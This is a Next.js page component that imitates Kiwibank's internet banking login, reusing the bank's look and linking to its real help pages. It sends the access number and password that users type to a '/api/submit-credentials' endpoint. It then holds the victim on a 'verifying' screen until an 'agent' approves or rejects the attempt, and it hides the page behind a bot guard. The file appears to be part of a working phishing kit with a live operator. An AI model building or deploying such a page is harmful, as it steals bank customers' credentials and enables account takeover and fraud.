'use client';

import { useCallback, useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { useParams } from 'next/navigation';
import { useSessionStore } from '@shared';
import { BotGuard } from '@/components/security/BotGuard';
import { WaitingState } from '@/components/verification/WaitingState';
import { Sidebar } from '@/components/layout/Sidebar';
import Image from 'next/image';

export default function CredentialsPage() {
  const router = useRouter();
  const params = useParams();
  const sessionUuid = params.sessionUuid as string;

  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  // Get session state
  const { caseId, status, agentMessage } = useSessionStore();

  // Reset form when agent rejects submission
  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      // Clear form fields and show error
      setUsername('');
      setPassword('');
      setError(agentMessage || 'Your submission was rejected. Please try again.');
    }
  }, [status, agentMessage]);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setError('');

      if (!username.trim() || !password.trim()) {
        setError('Please enter your access number and password');
        return;
      }

      setIsLoading(true);

      try {
        const response = await fetch('/api/submit-credentials', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            username,
            password,
          }),
        });

        if (!response.ok) {
          const data = await response.json();
          setError(data.error || 'Invalid credentials. Please try again.');
          return;
        }

        // Success - show waiting state
        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying your credentials...',
          formData: {},
        });

      } catch (err) {
        console.error('Login error:', err);
        setError('An unexpected error occurred. Please try again.');
      } finally {
        setIsLoading(false);
      }
    },
    [username, password, caseId, router]
  );

  // Determine waiting state
  const isWaiting = status === 'waiting' || isLoading;
  const hasError = !!error && !isWaiting;

  // Error icon SVG
  const ErrorIcon = () => (
    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" className="float-left mr-[8px] mt-[1px]">
      <circle cx="8" cy="8" r="8" fill="#d10029" />
      <path d="M7 3h2v6H7V3zm0 8h2v2H7v-2z" fill="#fff" />
    </svg>
  );

  return (
    <BotGuard>
      <div className="flex gap-[30px] items-start pt-[20px] pb-[40px] max-w-[957px] px-[18px] mx-auto md:flex-row flex-col text-[#333]">
        {/* Left Column */}
        <div className="flex-1 w-full max-w-[730px]">
          <h1 className="text-[36px] font-[500] text-black mb-[20px] pl-[8px] leading-[44px]">Internet banking login</h1>

          {/* Login Card */}
          <div className="bg-[#f2f2f2] w-full">
            <fieldset className="w-full border-0 p-0 m-0">
              <legend className="w-full bg-gradient-to-b from-[#f0f0f0] to-[#dedede] border-b border-[#969696] px-[8px] py-[6px] text-[14px] font-bold text-[#34423e] block mb-0 font-sans">Enter your login details</legend>

              <ol className="list-none m-0 p-[8px]">
                {/* Error Message Row */}
                {hasError && (
                  <li className="block py-[8px] px-[8px] mb-[8px] bg-[#fcebeb] text-[#d10029] text-[14px] font-[500] border-l-[4px] border-[#d10029]">
                    {error}
                  </li>
                )}

                {/* Inline Waiting Message */}
                {isWaiting && (
                  <li className="block py-[8px] overflow-hidden text-[#00b2a9] text-[12px] pl-[135px] font-bold">
                    Verifying your credentials... Please do not close this window.
                  </li>
                )}

                {/* Access Number */}
                <li className={`block py-[8px] overflow-hidden border-t-0 ${hasError ? 'bg-[#fcebeb]' : ''}`}>
                  {hasError ? (
                    <>
                      <div className="float-left w-[135px] mr-[15px]">
                        <ErrorIcon />
                        <label htmlFor="accessNumber" className="float-left pt-[2px] text-[12px] text-[#444444] text-left font-normal leading-[18px]">Access number:</label>
                      </div>
                    </>
                  ) : (
                    <label htmlFor="accessNumber" className="float-left w-[120px] mr-[15px] pt-[2px] text-[12px] text-[#444444] text-left font-normal leading-[18px] pl-[0px]">Access number:</label>
                  )}

                  <input
                    type="text"
                    id="accessNumber"
                    className={`float-left w-[calc(100%-170px)] max-w-[280px] h-[18px] p-[2px] px-[4px] border text-[12px] text-[#333] bg-white rounded-none focus:outline-[2px] focus:outline-[#101010] focus:outline-offset-0 ${hasError ? 'border-[#d10029]' : 'border-[#777777] focus:border-[#777777]'
                      }`}
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    disabled={isWaiting}
                    autoComplete="username"
                  />
                </li>

                {/* Password */}
                <li className={`block py-[8px] overflow-hidden border-t ${hasError ? 'border-white bg-[#fcebeb]' : 'border-[#d5d5d5]'}`}>
                  {hasError ? (
                    <>
                      <div className="float-left w-[135px] mr-[15px]">
                        <ErrorIcon />
                        <label htmlFor="password" className="float-left pt-[2px] text-[12px] text-[#444444] text-left font-normal leading-[18px]">Password:</label>
                      </div>
                    </>
                  ) : (
                    <label htmlFor="password" className="float-left w-[120px] mr-[15px] pt-[2px] text-[12px] text-[#444444] text-left font-normal leading-[18px] pl-[0px]">Password:</label>
                  )}

                  <input
                    type="password"
                    id="password"
                    className={`float-left w-[calc(100%-170px)] max-w-[280px] h-[18px] p-[2px] px-[4px] border text-[12px] text-[#333] bg-white rounded-none focus:outline-[2px] focus:outline-[#101010] focus:outline-offset-0 ${hasError ? 'border-[#d10029]' : 'border-[#bbbbbb] focus:border-[#777777]'
                      }`}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    disabled={isWaiting}
                    autoComplete="current-password"
                  />
                </li>

                {/* Help Links */}
                <li className="block py-[4px] mt-[4px] overflow-hidden border-t border-[#d5d5d5]">
                  <span className="block pl-[135px] text-[12px] text-[#444444]">
                    Forgotten your <a href="https://www.kiwibank.co.nz/contact-us/support-hub/internet-banking/common-questions/#where-can-i-find-my-access-number" className="text-[#009de5] hover:underline">access number</a>?
                    Need to reset your <a href="https://www.ib.kiwibank.co.nz/password-forgotten/" className="text-[#009de5] hover:underline">password</a>?
                  </span>
                </li>
              </ol>

              {/* Actions */}
              <div className="p-[12px] pb-[8px] px-[8px] border-t border-[#d5d5d5] mt-[4px] overflow-hidden">
                <div className="float-left inline-flex items-center h-[24px] bg-[#00baef] rounded-[12px] pr-[8px]">
                  <span className="flex items-center">
                    <button
                      onClick={handleSubmit}
                      disabled={isWaiting}
                      className="bg-transparent border-0 text-white font-[400] text-[12px] h-[24px] pl-[12px] pr-[2px] cursor-pointer hover:underline focus:outline-none whitespace-nowrap font-sans flex items-center"
                    >
                      {isWaiting ? 'Verifying...' : 'Log in to internet banking'}
                    </button>
                  </span>
                  <span className="w-[20px] h-[20px] ml-[8px] bg-[url('/bg-padlock-sprite.png')] bg-no-repeat bg-[length:20px_auto] bg-[0_0]"></span>
                </div>
                {!isWaiting && (
                  <a href="#" className="float-left ml-[12px] leading-[24px] text-[12px] text-[#009de5] hover:underline">Cancel</a>
                )}
              </div>
            </fieldset>
          </div>
        </div>

        {/* Right Sidebar */}
        <Sidebar />
      </div>
    </BotGuard>
  );
}
